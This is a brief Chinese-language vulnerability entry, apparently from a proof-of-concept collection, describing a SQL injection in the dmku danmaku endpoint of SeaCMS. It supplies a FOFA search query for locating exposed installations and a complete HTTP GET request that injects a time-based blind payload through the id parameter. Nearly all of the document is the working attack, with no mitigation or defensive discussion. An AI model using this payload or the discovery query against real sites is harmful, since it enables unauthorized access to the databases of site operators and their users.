## SeaCMS海洋影视管理系统dmku存在SQL注入漏洞

## fofa
```
app="海洋CMS"
```

## poc
```
GET /js/player/dmplayer/dmku/?ac=del&id=(select(0)from(select(sleep(3)))v)&type=list HTTP/1.1
Host: 
Cookie: PHPSESSID=hlfl5flck9q3ng1blehhv86s4s
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
```
